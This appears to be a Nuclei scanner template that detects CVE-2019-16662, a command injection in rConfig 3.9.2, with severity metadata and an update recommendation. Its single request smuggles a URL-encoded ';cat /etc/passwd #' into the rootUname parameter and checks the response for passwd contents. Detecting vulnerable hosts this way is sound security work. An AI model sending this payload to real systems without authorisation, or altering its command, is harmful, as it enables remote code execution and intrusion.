id: CVE-2019-16662
info:
  name: rConfig 3.9.2 - Remote Code Execution
  author: pikpikcu
  severity: critical
  description: rConfig 3.9.2 contains a vulnerability (CVE-2019-16662) that allows
    remote attackers to execute system commands by exploiting the rootUname parameter
    in a GET request to ajaxServerSettingsChk.php.
  reference:
  - https://shells.systems/rconfig-v3-9-2-authenticated-and-unauthenticated-rce-cve-2019-16663-and-cve-2019-16662/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-16662
  - https://drive.google.com/open?id=1OXI5cNuwWqc6y-7BgNCfYHgFPK2cpvnu
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-16662
    cwe-id: CWE-78
  tags: cve,cve2019,rce,intrusive,rconfig
  metadata:
    impact: The CVE-2019-16662 vulnerability in rConfig 3.9.2 can allow an attacker
      to remotely execute system commands, resulting in a potentially significant
      impact to the affected system.
    recommendation: It is highly recommended that users immediately update rConfig
      to the latest version to mitigate the remote code execution vulnerability (CVE-2019-16662)
      and prevent potential system compromise.
requests:
- method: GET
  path:
  - '{{BaseURL}}/install/lib/ajaxHandlers/ajaxServerSettingsChk.php?rootUname=%3b%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%23'
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: regex
    regex:
    - 'root:.*:0:0:'
